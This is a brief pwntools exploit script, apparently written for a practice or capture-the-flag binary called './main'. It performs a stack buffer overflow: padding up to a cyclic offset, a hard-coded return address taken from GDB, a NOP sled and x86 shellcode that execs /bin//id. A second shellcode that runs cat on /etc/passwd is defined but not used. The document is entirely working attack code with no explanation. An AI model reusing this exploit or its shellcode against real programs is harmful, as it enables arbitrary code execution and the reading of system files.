from pwn import *

p = process("./main")

print p.recvline()

raw_input("attach gdb")

offset = cyclic_find("ahaa")
pad = "A" * offset

EIP = p32(0xffffd280) # we found this address via GDB

sh_shellcode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//id\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
passwd_shellcode="\x31\xc0\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80"

NOP = "\x90" * 100
p.sendline("1234\0" + pad + EIP + NOP + sh_shellcode)
p.interactive()